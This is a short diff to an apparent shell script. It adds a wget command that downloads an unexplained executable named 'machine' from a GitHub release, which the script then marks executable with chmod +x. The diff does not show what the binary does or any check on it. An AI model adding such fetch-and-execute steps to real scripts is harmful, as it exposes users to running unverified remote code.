@@ -1,3 +1,4 @@
+wget https://github.com/Akira-Slasvi/machine-learn/releases/download/%23machinellearn/machine
 echo project start
 echo training machine program
 chmod +x machine
